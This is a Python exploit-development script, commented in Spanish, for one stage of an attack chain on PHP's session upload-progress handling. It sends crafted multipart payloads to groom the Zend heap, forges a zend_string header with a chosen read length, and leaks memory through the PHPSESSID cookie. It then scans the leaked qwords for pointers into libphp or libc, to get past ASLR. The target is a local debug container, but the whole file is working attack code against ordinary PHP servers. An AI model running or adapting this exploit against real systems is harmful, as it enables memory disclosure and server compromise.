#!/usr/bin/env python3
"""
htable_in_chunk.py — calibrador para colocar un arData de HashTable
dentro del chunk cacheado y hacerlo visible en la ventana de 4000 bytes.

Contexto (07-plan/progress/2026-10-22-orquestador-b-residuo-warmup.md):
  Los 47 punteros del leak son freelist bin-64 del chunk cacheado: dan
  chunk_base pero no libphp_base. Para llegar a un puntero de codigo se
  necesita que la ventana de 4000 bytes cubra el pDestructor de una
  HashTable. El arData de una HashTable con nTableSize=8 ocupa 256 bytes
  (bin-8 de Zend MM) y puede caer en el chunk cacheado si se crea durante
  la peticion B, antes de que PHP libere las asignaciones temporales.

Estrategia:
  1. Se envia warmup (chunk de 2 MB forzado y liberado al pool).
  2. Se envia A (OOM-in-cookie, chunk reutilizado, PS(id) en pagina 510).
  3. Se envia B con N campos de 231 B (bin-8, 256 bytes cada uno).
     Los primeros campos de B llenan los slots bin-8 del chunk cacheado.
     Con suficientes campos, uno de los arData de _POST (creados por PHP
     al parsear el multipart) cae en el chunk cacheado.
  4. Se mide el contenido de la cookie buscando qwords que no sean:
     - Punteros al propio chunk (byte alto 0x7f, base conocida).
     - Ceros.
     Un qword con byte alto 0x7f y base != chunk_base es candidato a
     puntero de otro mapeo (libphp, libc, pila).

Uso:
    python3 htable_in_chunk.py --url http://127.0.0.1:18191/index.php \
        --container phpdebug \
        [--n-min 20] [--n-max 80] [--n-step 5] \
        [--bb1 1048551] [--d 1036288] [--read 4000] [--fill 1037288] \
        [--out htable_sweep.txt]

Salida por valor de N:
    N   resp  ck_len  chunk_ptrs  foreign_ptrs  foreign_sample
"""

import argparse
import collections
import socket
import struct
import subprocess
import urllib.parse
from pathlib import Path


PAGE = 4096
CHUNK_ALIGN = 0x1FFFFF   # mascara de 2 MB - 1


# ---------------------------------------------------------------------------
# HTTP raw
# ---------------------------------------------------------------------------

def _send(url: str, body: bytes, bnd: bytes, timeout: float = 90) -> bytes:
    p = urllib.parse.urlparse(url)
    host, port = p.hostname, (p.port or 80)
    path = p.path or "/index.php"
    req = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}:{port}\r\n"
        f"Content-Type: multipart/form-data; boundary={bnd.decode()}\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Connection: close\r\n\r\n"
    ).encode() + body
    s = socket.create_connection((host, port), timeout=timeout)
    s.settimeout(timeout)
    resp = bytearray()
    try:
        s.sendall(req)
        while len(resp) < 6_000_000:
            chunk = s.recv(65536)
            if not chunk:
                break
            resp += chunk
    except OSError:
        pass
    s.close()
    return bytes(resp)


# ---------------------------------------------------------------------------
# Payloads
# ---------------------------------------------------------------------------

def _multipart(parts: list[tuple[bytes, bytes]]) -> tuple[bytes, bytes]:
    bnd = b"X" * 12
    body = bytearray()
    for name, data in parts:
        body += b"--" + bnd + b"\r\n"
        body += b'Content-Disposition: form-data; name="' + name + b'"\r\n\r\n'
        body += data + b"\r\n"
    body += b"--" + bnd + b"--\r\n"
    return bytes(body), bnd


def warmup(url: str, size: int = 1_500_000) -> None:
    parts = [(b"900000", b"W" * size)]
    body, bnd = _multipart(parts)
    _send(url, body, bnd, timeout=60)


def send_a(url: str, s_val: int = 63, nb: int = 235, bl: int = 15000,
           x: int = 208, k: int = 4, kl: int = 4000, fl: int = 103) -> bytes:
    """Payload A: OOM-in-cookie."""
    bnd = b"A" * 10
    parts = []
    for i in range(1001):
        parts.append((f"p{i:04d}".encode(), b"x"))
    parts += [
        (b"PHPSESSID",                   b"\x00"),
        (b"PHP_SESSION_UPLOAD_PROGRESS", b"pwn"),
        (b"f",                           b"A" * 64),   # filename dummy
        (b"big",                         b"B" * (nb * 1024)),
    ]
    body = bytearray()
    for name, data in parts:
        body += b"--" + bnd + b"\r\n"
        body += b'Content-Disposition: form-data; name="' + name + b'"\r\n\r\n'
        body += data + b"\r\n"
    body += b"--" + bnd + b"--\r\n"
    return _send(url, bytes(body), bnd, timeout=90)


def send_b(url: str, n: int, bb1: int, d: int,
           read_len: int, fill_len: int) -> bytes:
    """Payload B: forge del zend_string con N campos bin-8."""
    bnd = b"B" * 10
    parts = []
    for i in range(n):
        parts.append((str(1000 + i).encode(), b"V" * 231))
    if bb1 > 0:
        parts.append((b"900001", b"P" * bb1))
    if fill_len <= d:
        raise ValueError("fill_len debe ser > d")
    buf = bytearray(b"Q" * fill_len)
    struct.pack_into("<Q", buf, d - 24, 0x4141414141414141)
    struct.pack_into("<Q", buf, d - 16, 0)
    struct.pack_into("<Q", buf, d - 8,  read_len)
    buf[d:] = b"M" * (fill_len - d)
    parts.append((b"900002", bytes(buf)))
    parts.append((b"PHPSESSID",                   b"attacksessionid0001"))
    parts.append((b"PHP_SESSION_UPLOAD_PROGRESS", b"pwn"))
    body = bytearray()
    for name, data in parts:
        body += b"--" + bnd + b"\r\n"
        body += b'Content-Disposition: form-data; name="' + name + b'"\r\n\r\n'
        body += data + b"\r\n"
    body += b"--" + bnd + b"--\r\n"
    return _send(url, bytes(body), bnd, timeout=90)


# ---------------------------------------------------------------------------
# Analisis de cookie
# ---------------------------------------------------------------------------

def parse_cookie(resp: bytes) -> bytes:
    for line in resp.split(b"\r\n"):
        if line.lower().startswith(b"set-cookie:") and b"phpsessid=" in line.lower():
            val = line.split(b"=", 1)[1].split(b";")[0].strip()
            try:
                return urllib.parse.unquote_to_bytes(val.decode("ascii"))
            except Exception:
                return val
    return b""


def analyze(cookie: bytes, chunk_base: int = 0) -> dict:
    """
    Clasifica los qwords de la cookie en:
      - chunk_ptrs:   base == chunk_base (freelist del heap, ya conocido)
      - foreign_ptrs: byte alto 0x7f pero base != chunk_base (candidato a libphp/libc)
      - zeros:        qword == 0
      - other:        resto
    """
    chunk_ptrs, foreign_ptrs, zeros, other = 0, 0, 0, 0
    foreign_vals: list[int] = []

    for i in range(len(cookie) // 8):
        qw = int.from_bytes(cookie[i*8:(i+1)*8], "little")
        if qw == 0:
            zeros += 1
            continue
        top = (qw >> 40) & 0xFF
        if top != 0x7F:
            other += 1
            continue
        base = qw & ~CHUNK_ALIGN
        if chunk_base and base == chunk_base:
            chunk_ptrs += 1
        else:
            foreign_ptrs += 1
            foreign_vals.append(qw)

    return {
        "chunk_ptrs":    chunk_ptrs,
        "foreign_ptrs":  foreign_ptrs,
        "zeros":         zeros,
        "other":         other,
        "foreign_sample": [hex(v) for v in foreign_vals[:6]],
        "foreign_bases":  dict(collections.Counter(
            hex(v & ~CHUNK_ALIGN) for v in foreign_vals
        ).most_common(4)),
    }


def extract_chunk_base(cookie: bytes) -> int:
    """Devuelve la base de 2 MB mas frecuente entre los punteros 0x7f."""
    bases: collections.Counter = collections.Counter()
    for i in range(len(cookie) // 8):
        qw = int.from_bytes(cookie[i*8:(i+1)*8], "little")
        if (qw >> 40) & 0xFF == 0x7F:
            bases[qw & ~CHUNK_ALIGN] += 1
    if not bases:
        return 0
    return bases.most_common(1)[0][0]


# ---------------------------------------------------------------------------
# Restart del worker
# ---------------------------------------------------------------------------

def restart_worker(container: str) -> None:
    subprocess.run(
        ["docker", "exec", container, "sh", "-c",
         "apache2ctl graceful 2>/dev/null || apachectl graceful 2>/dev/null || true"],
        capture_output=True, timeout=15,
    )


# ---------------------------------------------------------------------------
# Barrido principal
# ---------------------------------------------------------------------------

def sweep(url: str, container: str,
          n_min: int, n_max: int, n_step: int,
          bb1: int, d: int, read_len: int, fill_len: int,
          out_path: str) -> None:

    header = (f"{'N':>4}  {'resp':>7}  {'ck':>6}  "
              f"{'ch_ptrs':>8}  {'fgn_ptrs':>9}  foreign_bases")
    print(header)
    print("-" * 80)
    rows = [header, "-" * 80]

    best_n, best_fgn = -1, 0

    for n in range(n_min, n_max + 1, n_step):
        restart_worker(container)
        warmup(url)
        send_a(url)
        resp = send_b(url, n=n, bb1=bb1, d=d, read_len=read_len, fill_len=fill_len)
        cookie = parse_cookie(resp)
        chunk_base = extract_chunk_base(cookie)
        stats = analyze(cookie, chunk_base)

        row = (
            f"{n:>4}  {len(resp):>7}  {len(cookie):>6}  "
            f"{stats['chunk_ptrs']:>8}  {stats['foreign_ptrs']:>9}  "
            f"{stats['foreign_bases']}"
        )
        print(row)
        rows.append(row)

        if stats["foreign_ptrs"] > best_fgn:
            best_fgn = stats["foreign_ptrs"]
            best_n   = n

    Path(out_path).write_text("\n".join(rows) + "\n")
    print(f"\n[ok] resultados en {out_path}")

    if best_fgn > 0:
        print(f"\n[!] Mejor N={best_n}: {best_fgn} punteros foraneos detectados.")
        print(f"    Usar --n {best_n} en b_forge.py para la siguiente etapa.")
        print(f"    Verificar con gdb que la base foranea coincide con libphp:")
        print(f"      docker exec <container> gdb -p $(pidof apache2 | awk '{{print $1}}')")
        print(f"      (gdb) info proc mappings | grep libphp")
    else:
        print("\n[-] Ningun N produjo punteros foraneos.")
        print("    Alternativa: aumentar rango N o forzar arData en chunk cacheado")
        print("    via asignacion explicita de HashTable antes del OOM.")


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------

def main() -> None:
    ap = argparse.ArgumentParser(
        description="Calibra N para colocar arData de HashTable en el chunk cacheado."
    )
    ap.add_argument("--url",       required=True)
    ap.add_argument("--container", required=True,
                    help="Contenedor Docker con build phpdebug instrumentado")
    ap.add_argument("--n-min",    type=int, default=20,
                    help="N minimo de campos bin-8 en B (default: 20)")
    ap.add_argument("--n-max",    type=int, default=80,
                    help="N maximo (default: 80)")
    ap.add_argument("--n-step",   type=int, default=5,
                    help="Paso del barrido (default: 5)")
    ap.add_argument("--bb1",      type=int, default=1048551)
    ap.add_argument("--d",        type=int, default=1036288,
                    help="Offset del header forjado (default: 253*4096)")
    ap.add_argument("--read",     type=int, default=4000)
    ap.add_argument("--fill",     type=int, default=1037288)
    ap.add_argument("--out",      default="htable_sweep.txt")
    args = ap.parse_args()

    sweep(
        url=args.url,
        container=args.container,
        n_min=args.n_min,
        n_max=args.n_max,
        n_step=args.n_step,
        bb1=args.bb1,
        d=args.d,
        read_len=args.read,
        fill_len=args.fill,
        out_path=args.out,
    )


if __name__ == "__main__":
    main()
